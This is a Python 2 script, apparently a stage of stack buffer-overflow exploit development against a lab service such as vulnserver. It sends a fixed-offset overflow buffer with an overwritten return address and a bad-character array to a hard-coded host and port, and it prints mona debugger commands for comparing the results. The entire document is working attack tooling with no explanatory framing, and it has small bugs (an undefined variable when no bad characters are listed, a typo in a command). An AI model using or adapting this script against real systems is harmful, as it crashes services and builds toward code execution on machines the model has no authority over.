#!/usr/bin/python
import sys, socket
import os
from time import sleep

timeout = 5
#Add vulnerable server's IP address and port to connect
addr = ('192.168.155.10',2233)
#Add command to send prepended to the buffer, eg. 'TRUN .' for vulnserver.exe
cmd = ""
#Add bad characters to the list as you find them
bad = "\x00\x51"
offset = 2306

def find_badchars(addr,cmd,bad,offset,timeout):
	buffer = "A" * int(offset) + "B" * 4
	badchars = ''
	h = [ord(c) for c in bad]
	for x in range(1, 256):
		if x not in h:
			badchars = badchars + "{:02x}".format(x)
	badchars = bytearray.fromhex(badchars)
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
#			s.recv(1024)
			s.send(cmd + buffer + badchars)
			print "Sent badchars array excluding specified bad chars " + str(j)
			s.close()
			sleep(1)
		except:
			print "Run -> !mona compare -f C:\\mona\\<program name>\\bytearray.bin -a <ESP address> "
			print "Rerun module until all the chars in the stack are unmodified"
			return
	return



##########################################
#For dispalying badchars in print messages
if len(bad) > 0:
	j = ''
	i = [ord(c) for c in bad]
	for x in range(0, 256):
		if x in i:
			j = j + "\\x{:02x}".format(x)

#########################################

print "Run -> !mona config -set workingfoldser c:\\mona\\%p "
print "Run -> !mona bytearray -b \"%s\" " % j
raw_input("Press any key to send the Badchar array")
find_badchars(addr,cmd,bad,offset,timeout)
